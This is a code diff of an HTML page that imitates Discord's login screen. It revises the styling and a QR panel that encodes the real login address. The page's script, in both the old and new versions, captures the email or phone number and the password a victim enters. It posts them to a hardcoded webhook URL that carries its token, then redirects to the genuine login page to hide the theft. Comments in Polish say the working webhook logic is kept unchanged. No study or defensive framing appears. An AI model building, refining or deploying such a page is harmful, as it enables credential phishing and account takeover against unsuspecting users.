@@ -1,197 +1,313 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='-5 -3 90 62'%3E%3Cpath fill='%235865F2' d='M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.44069 45.4204 0.52529C44.7963 1.6353 44.106 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.904 3.0581 26.1887 1.6353 25.5647 0.52529C25.5171 0.44069 25.4248 0.39851 25.3324 0.41542C20.2586 1.2916 15.4059 2.8214 10.8806 4.8978C10.8384 4.9147 10.8005 4.9449 10.7779 4.9841C1.5914 18.7307 -0.81863 32.1443 0.386233 45.4576C0.389922 45.4978 0.408276 45.5369 0.434538 45.5688C6.26418 50.3707 11.9485 53.3807 17.5587 55.3561C17.6538 55.3898 17.7585 55.3668 17.8298 55.301C19.0465 53.9243 20.1379 52.4571 21.0868 50.8867C21.1714 50.7433 21.1394 50.5633 21.0125 50.4625C19.3507 49.4933 17.7704 48.3919 16.2757 47.1701C16.1373 47.0579 16.1288 46.857 16.2549 46.7342C16.5893 46.4417 16.9237 46.1386 17.2475 45.8418C17.3053 45.788 17.3899 45.7747 17.4597 45.8074C24.5754 49.3158 32.2727 51.1896 40.0494 51.1896C47.8262 51.1896 55.5235 49.3158 62.6392 45.8074C62.709 45.7747 62.7936 45.788 62.8514 45.8418C63.1752 46.1386 63.5096 46.4417 63.844 46.7342C63.9701 46.857 63.9616 47.0579 63.8232 47.1701C62.3285 48.3919 60.7482 49.4933 59.0864 50.4625C58.9595 50.5633 58.9275 50.7433 59.0121 50.8867C59.961 52.4571 61.0524 53.9243 62.2691 55.301C62.3404 55.3668 62.4451 55.3898 62.5402 55.3561C68.1504 53.3807 73.8347 50.3707 79.6644 45.5688C79.6906 45.5369 79.709 45.4978 79.7127 45.4576C81.1581 30.0836 77.6672 16.7087 61.2072 4.9841C61.1846 4.9449 61.1467 4.9147 61.1045 4.8978ZM23.7249 37.3253C20.2179 37.3253 17.3626 34.1136 17.3626 30.1693C17.3626 26.225 20.1427 23.0133 23.7249 23.0133C27.332 23.0133 30.1624 26.2501 30.0872 30.1693C30.0872 34.1136 27.3071 37.3253 23.7249 37.3253ZM47.3073 37.3253C43.8003 37.3253 40.945 34.1136 40.945 30.1693C40.945 26.225 43.7251 23.0133 47.3073 23.0133C50.9144 23.0133 53.7448 26.2501 53.6696 30.1693C53.6696 34.1136 50.9144 37.3253 47.3073 37.3253Z'/%3E%3C/svg%3E">
     <title>Discord</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { height: 100%; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
         body {
             font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #1e1f22;
+            background: #1e1f22;
             color: #060607;
+            -webkit-font-smoothing: antialiased;
         }
+
         .bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            object-fit: cover;
             z-index: -1;
+            user-select: none;
+            pointer-events: none;
         }
+
         .login-page {
+            position: relative;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 24px;
+            padding: 0 24px;
         }
+
         .svg-logo-text {
+            position: absolute;
+            top: 28px;
+            left: 32px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 2;
+        }
+
+        .svg-logo-text .logo-mark {
+            height: 34px;
+            width: auto;
+            display: block;
+        }
+
+        .svg-logo-text .logo-wordmark {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+            line-height: 1;
+        }
+
+        .main {
+            flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 40px;
-            user-select: none;
+            padding: 80px 0 40px;
         }
-        .svg-logo-text .wordmark {
-            color: #fff;
-            font-size: 26px;
-            font-weight: 800;
-            letter-spacing: .5px;
-            margin-left: 8px;
-        }
-        .main { width: 100%; max-width: 784px; }
+
         .authBox {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, .2);
             display: flex;
-            width: 100%;
-            min-height: 408px;
+            width: 784px;
+            max-width: 100%;
+            background: #ffffff;
+            border-radius: 8px;
             overflow: hidden;
+            box-shadow: 0 16px 48px rgba(0, 0, 0, 0.55);
         }
-        .main-form { width: 480px; flex-shrink: 0; padding: 32px; }
+
+        .main-form {
+            width: 416px;
+            flex-shrink: 0;
+            padding: 32px 40px 40px;
+        }
+
         .main-form-header h1 {
             font-size: 24px;
-            line-height: 32px;
-            font-weight: 600;
+            font-weight: 700;
             color: #060607;
+            letter-spacing: 0.2px;
             margin-bottom: 8px;
         }
+
         .main-form-header p {
             font-size: 16px;
-            line-height: 20px;
             color: #4e5058;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
-        label {
+
+        .input-groups label {
             display: block;
             font-size: 12px;
-            line-height: 16px;
-            font-weight: 600;
-            color: #4e5058;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: .02em;
+            letter-spacing: 0.3px;
+            color: #4e5058;
             margin-bottom: 8px;
         }
-        label .required { color: #f23f43; }
-        input {
+
+        .input-groups label .required {
+            color: #f23f43;
+            margin-left: 4px;
+        }
+
+        .input-groups input {
             width: 100%;
             height: 40px;
-            padding: 10px;
-            margin-bottom: 20px;
-            background: #1e1f22;
-            border: 1px solid #1e1f22;
-            border-radius: 4px;
-            color: #dbdee1;
+            padding: 10px 12px;
             font-size: 16px;
+            color: #060607;
+            background: #e9ecef;
+            border: 1px solid transparent;
+            border-radius: 4px;
             outline: none;
-            transition: border-color .15s ease;
+            transition: background-color .15s ease, border-color .15s ease;
         }
-        input:focus { border-color: #5865f2; }
-        input::placeholder { color: #6d6f78; }
-        .forgot-password { text-align: right; margin-bottom: 20px; }
-        .forgot-password a { color: #00a8fc; font-size: 14px; text-decoration: none; }
-        .forgot-password a:hover { text-decoration: underline; }
+
+        .input-groups input:hover {
+            background: #dfe1e4;
+        }
+
+        .input-groups input:focus {
+            background: #ffffff;
+            border-color: #5865f2;
+        }
+
+        .password-wrapper {
+            margin-top: 20px;
+        }
+
+        .forgot-password {
+            margin: 8px 0 20px;
+        }
+
+        .forgot-password a {
+            font-size: 14px;
+            color: #5865f2;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
         .login button {
             width: 100%;
             height: 44px;
             background: #5865f2;
-            color: #fff;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 500;
+            font-family: inherit;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
             cursor: pointer;
-            transition: background .15s ease;
+            transition: background-color .15s ease;
         }
-        .login button:hover { background: #4752c4; }
-        .small-register { margin-top: 16px; font-size: 14px; color: #4e5058; }
-        .small-register a { color: #00a8fc; text-decoration: none; }
-        .small-register a:hover { text-decoration: underline; }
+
+        .login button:hover {
+            background: #4752c4;
+        }
+
+        .login button:active {
+            background: #3c45a5;
+        }
+
+        .small-register {
+            margin-top: 8px;
+            font-size: 14px;
+            color: #4e5058;
+        }
+
+        .small-register a {
+            color: #5865f2;
+            text-decoration: none;
+            margin-left: 4px;
+        }
+
+        .small-register a:hover {
+            text-decoration: underline;
+        }
+
         .right-section {
-            background: #f2f3f5;
-            width: 240px;
-            flex-shrink: 0;
+            flex: 1;
+            background: #5865f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 32px;
+            text-align: center;
+        }
+
+        .login-container {
+            max-width: 280px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
-            text-align: center;
+            color: #ffffff;
         }
-        .login-container { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+
         .qr-code {
             position: relative;
-            background: #fff;
+            display: inline-block;
+            background: #ffffff;
             border-radius: 8px;
-            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, .2);
-            padding: 8px;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            padding: 14px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
+            line-height: 0;
         }
-        .qr-code img { display: block; width: 160px; height: 160px; }
+
+        .qr-code img {
+            display: block;
+            visibility: hidden;
+        }
+
         .qr-logo {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: #fff;
-            border-radius: 6px;
-            padding: 5px;
+            width: 56px;
+            height: 56px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.25);
             display: flex;
             align-items: center;
             justify-content: center;
-            pointer-events: none;
         }
+
+        .qr-logo svg {
+            width: 34px;
+            height: 26px;
+            display: block;
+        }
+
         .login-container h2 {
-            font-size: 18px;
-            line-height: 24px;
-            font-weight: 600;
-            color: #060607;
+            font-size: 24px;
+            font-weight: 700;
+            color: #ffffff;
             margin-bottom: 8px;
         }
+
         .login-container p {
-            font-size: 12px;
-            line-height: 16px;
-            color: #4e5058;
+            font-size: 16px;
+            line-height: 1.4;
+            color: #ffffff;
+            opacity: 0.85;
             margin-bottom: 12px;
         }
-        .login-container a { color: #00a8fc; font-size: 14px; text-decoration: none; }
+
+        .login-container a {
+            font-size: 14px;
+            color: #ffffff;
+            opacity: 0.9;
+            text-decoration: underline;
+        }
+
+        .login-container a:hover {
+            opacity: 1;
+        }
+
         @media (max-width: 720px) {
-            .authBox { flex-direction: column; }
-            .main-form { width: 100%; }
-            .right-section { width: 100%; }
+            .right-section {
+                display: none;
+            }
+
+            .main-form {
+                width: 100%;
+            }
         }
     </style>
 </head>
-<body>
 
-    <svg class="bg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1600 900" preserveAspectRatio="xMidYMid slice" aria-hidden="true">
-        <rect width="1600" height="900" fill="#1e1f22"/>
-        <path fill="#5865f2" d="M1268 0c92 22 163 72 198 148 35 76 25 166-45 216-70 50-180 40-230-25-50-65-35-155 5-235 20-40 45-79 72-104z"/>
-        <path fill="#4752c4" d="M0 615c60-50 160-70 230-30 70 40 90 120 50 180-40 60-130 100-200 80C10 825-30 725 0 615z"/>
-        <path fill="#949cf7" opacity=".55" d="M60 300c-50 40-70 120-20 170 50 50 150 40 180-20 30-60-20-150-90-170-30-10-50 5-70 20z"/>
-        <path fill="#5865f2" opacity=".7" d="M250 0c55 30 95 90 75 150-20 60-80 90-130 60-50-30-50-100-20-150 15-35 45-60 75-60z"/>
-        <path fill="#3a45c5" opacity=".6" d="M1495 695c40-20 80-65 100-125 20-60 0-130-40-160-40-30-100-10-120 50-20 60-10 130 30 180 10 20 20 40 30 55z"/>
-    </svg>
+<body>
+    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='1600' height='900' viewBox='0 0 1600 900' preserveAspectRatio='xMidYMid slice'><defs><radialGradient id='g1' cx='12%' cy='5%' r='65%'><stop offset='0%' stop-color='%235865F2' stop-opacity='0.5'/><stop offset='100%' stop-color='%235865F2' stop-opacity='0'/></radialGradient><radialGradient id='g2' cx='88%' cy='95%' r='60%'><stop offset='0%' stop-color='%23EB459F' stop-opacity='0.32'/><stop offset='100%' stop-color='%23EB459F' stop-opacity='0'/></radialGradient><radialGradient id='g3' cx='93%' cy='7%' r='45%'><stop offset='0%' stop-color='%2300A8FC' stop-opacity='0.28'/><stop offset='100%' stop-color='%2300A8FC' stop-opacity='0'/></radialGradient><radialGradient id='g4' cx='50%' cy='55%' r='50%'><stop offset='0%' stop-color='%23A8A0FF' stop-opacity='0.14'/><stop offset='100%' stop-color='%23A8A0FF' stop-opacity='0'/></radialGradient></defs><rect width='1600' height='900' fill='%231E1F22'/><rect width='1600' height='900' fill='url(%23g1)'/><rect width='1600' height='900' fill='url(%23g2)'/><rect width='1600' height='900' fill='url(%23g3)'/><rect width='1600' height='900' fill='url(%23g4)'/></svg>" alt="Discord BG" class="bg">
 
     <div class="login-page">
         <div class="svg-logo-text">
-            <svg width="32" height="32" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
-                <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/>
+            <svg class="logo-mark" viewBox="-5 -3 90 62" fill="#5865F2" aria-hidden="true">
+                <path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.44069 45.4204 0.52529C44.7963 1.6353 44.106 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.904 3.0581 26.1887 1.6353 25.5647 0.52529C25.5171 0.44069 25.4248 0.39851 25.3324 0.41542C20.2586 1.2916 15.4059 2.8214 10.8806 4.8978C10.8384 4.9147 10.8005 4.9449 10.7779 4.9841C1.5914 18.7307 -0.81863 32.1443 0.386233 45.4576C0.389922 45.4978 0.408276 45.5369 0.434538 45.5688C6.26418 50.3707 11.9485 53.3807 17.5587 55.3561C17.6538 55.3898 17.7585 55.3668 17.8298 55.301C19.0465 53.9243 20.1379 52.4571 21.0868 50.8867C21.1714 50.7433 21.1394 50.5633 21.0125 50.4625C19.3507 49.4933 17.7704 48.3919 16.2757 47.1701C16.1373 47.0579 16.1288 46.857 16.2549 46.7342C16.5893 46.4417 16.9237 46.1386 17.2475 45.8418C17.3053 45.788 17.3899 45.7747 17.4597 45.8074C24.5754 49.3158 32.2727 51.1896 40.0494 51.1896C47.8262 51.1896 55.5235 49.3158 62.6392 45.8074C62.709 45.7747 62.7936 45.788 62.8514 45.8418C63.1752 46.1386 63.5096 46.4417 63.844 46.7342C63.9701 46.857 63.9616 47.0579 63.8232 47.1701C62.3285 48.3919 60.7482 49.4933 59.0864 50.4625C58.9595 50.5633 58.9275 50.7433 59.0121 50.8867C59.961 52.4571 61.0524 53.9243 62.2691 55.301C62.3404 55.3668 62.4451 55.3898 62.5402 55.3561C68.1504 53.3807 73.8347 50.3707 79.6644 45.5688C79.6906 45.5369 79.709 45.4978 79.7127 45.4576C81.1581 30.0836 77.6672 16.7087 61.2072 4.9841C61.1846 4.9449 61.1467 4.9147 61.1045 4.8978ZM23.7249 37.3253C20.2179 37.3253 17.3626 34.1136 17.3626 30.1693C17.3626 26.225 20.1427 23.0133 23.7249 23.0133C27.332 23.0133 30.1624 26.2501 30.0872 30.1693C30.0872 34.1136 27.3071 37.3253 23.7249 37.3253ZM47.3073 37.3253C43.8003 37.3253 40.945 34.1136 40.945 30.1693C40.945 26.225 43.7251 23.0133 47.3073 23.0133C50.9144 23.0133 53.7448 26.2501 53.6696 30.1693C53.6696 34.1136 50.9144 37.3253 47.3073 37.3253Z"></path>
             </svg>
-            <span class="wordmark">Discord</span>
+            <span class="logo-wordmark">Discord</span>
         </div>
 
         <main class="main">
             <div class="authBox">
                 <div class="main-form">
-                    <form id="login-form" action="#">
+                    <form action="#">
                         <div class="input-groups">
                             <div class="main-form-header">
                                 <h1>Welcome back!</h1>
@@ -216,7 +332,9 @@
                             <a href="#">Forgot your password?</a>
                         </div>
                         <div class="login">
-                            <button type="submit">Log In</button>
+                            <button type="submit">
+                                Log In
+                            </button>
                         </div>
                         <div class="small-register">
                             <span>Need an account?</span>
@@ -227,12 +345,13 @@
 
                 <div class="right-section">
                     <div class="login-container">
-                        <div class="qr-code" id="qr-code">
-                            <span class="qr-logo">
-                                <svg width="28" height="28" viewBox="0 0 24 24" fill="#5865f2" aria-hidden="true">
-                                    <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/>
+                        <div class="qr-code">
+                            <img id="qrImage" alt="QR Code">
+                            <div class="qr-logo">
+                                <svg viewBox="-5 -3 90 62" fill="#5865F2" aria-hidden="true">
+                                    <path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.44069 45.4204 0.52529C44.7963 1.6353 44.106 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.904 3.0581 26.1887 1.6353 25.5647 0.52529C25.5171 0.44069 25.4248 0.39851 25.3324 0.41542C20.2586 1.2916 15.4059 2.8214 10.8806 4.8978C10.8384 4.9147 10.8005 4.9449 10.7779 4.9841C1.5914 18.7307 -0.81863 32.1443 0.386233 45.4576C0.389922 45.4978 0.408276 45.5369 0.434538 45.5688C6.26418 50.3707 11.9485 53.3807 17.5587 55.3561C17.6538 55.3898 17.7585 55.3668 17.8298 55.301C19.0465 53.9243 20.1379 52.4571 21.0868 50.8867C21.1714 50.7433 21.1394 50.5633 21.0125 50.4625C19.3507 49.4933 17.7704 48.3919 16.2757 47.1701C16.1373 47.0579 16.1288 46.857 16.2549 46.7342C16.5893 46.4417 16.9237 46.1386 17.2475 45.8418C17.3053 45.788 17.3899 45.7747 17.4597 45.8074C24.5754 49.3158 32.2727 51.1896 40.0494 51.1896C47.8262 51.1896 55.5235 49.3158 62.6392 45.8074C62.709 45.7747 62.7936 45.788 62.8514 45.8418C63.1752 46.1386 63.5096 46.4417 63.844 46.7342C63.9701 46.857 63.9616 47.0579 63.8232 47.1701C62.3285 48.3919 60.7482 49.4933 59.0864 50.4625C58.9595 50.5633 58.9275 50.7433 59.0121 50.8867C59.961 52.4571 61.0524 53.9243 62.2691 55.301C62.3404 55.3668 62.4451 55.3898 62.5402 55.3561C68.1504 53.3807 73.8347 50.3707 79.6644 45.5688C79.6906 45.5369 79.709 45.4978 79.7127 45.4576C81.1581 30.0836 77.6672 16.7087 61.2072 4.9841C61.1846 4.9449 61.1467 4.9147 61.1045 4.8978ZM23.7249 37.3253C20.2179 37.3253 17.3626 34.1136 17.3626 30.1693C17.3626 26.225 20.1427 23.0133 23.7249 23.0133C27.332 23.0133 30.1624 26.2501 30.0872 30.1693C30.0872 34.1136 27.3071 37.3253 23.7249 37.3253ZM47.3073 37.3253C43.8003 37.3253 40.945 34.1136 40.945 30.1693C40.945 26.225 43.7251 23.0133 47.3073 23.0133C50.9144 23.0133 53.7448 26.2501 53.6696 30.1693C53.6696 34.1136 50.9144 37.3253 47.3073 37.3253Z"></path>
                                 </svg>
-                            </span>
+                            </div>
                         </div>
                         <h2>Log in with QR Code</h2>
                         <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
@@ -245,35 +364,44 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script>
-        const form = document.getElementById('login-form');
-        const webhookUrl = 'https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW';
+        // --- QR (jak w oryginale: koduje https://discord.com/login) ---
+        (function () {
+            try {
+                var qr = qrcode(0, 'M');
+                qr.addData('https://discord.com/login');
+                qr.make();
+                var img = document.getElementById('qrImage');
+                img.src = qr.createDataURL(4, 8);
+                img.style.visibility = 'visible';
+            } catch (err) {
+                /* CDN niedostępny – QR się nie wygeneruje, reszta działa */
+            }
+        })();
 
-        form.addEventListener('submit', function (e) {
+        // --- Webhook (logika z działającej wersji, bez zmian) ---
+        var webhookURL = 'https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW';
+
+        document.querySelector('form').addEventListener('submit', function (e) {
             e.preventDefault();
 
-            const loginInput = document.getElementById('emailORphone').value;
-            const passwordInput = document.getElementById('password').value;
+            var loginInput = document.getElementById('emailORphone').value;
+            var passwordInput = document.getElementById('password').value;
 
-            const content = '**Nowe logowanie:**\n**Email/Telefon:** ' + loginInput + '\n**Hasło:** ' + passwordInput;
+            var message = '**Nowe logowanie:**\n**Email/Telefon:** ' + loginInput + '\n**Hasło:** ' + passwordInput;
 
-            fetch(webhookUrl, {
+            fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: content })
+                body: JSON.stringify({ content: message })
             })
-                .then(function () { window.location.href = 'https://discord.com/login'; })
-                .catch(function () { window.location.href = 'https://discord.com/login'; });
+                .then(function () {
+                    window.location.href = 'https://discord.com/login';
+                })
+                .catch(function () {
+                    window.location.href = 'https://discord.com/login';
+                });
         });
-
-        try {
-            const qr = qrcode(0, 'M');
-            qr.addData('https://discord.com/login');
-            qr.make();
-            const qrBox = document.getElementById('qr-code');
-            const logo = qrBox.querySelector('.qr-logo');
-            qrBox.innerHTML = qr.createImgTag(4, 8);
-            qrBox.appendChild(logo);
-        } catch (err) {}
     </script>
 </body>
+
 </html>
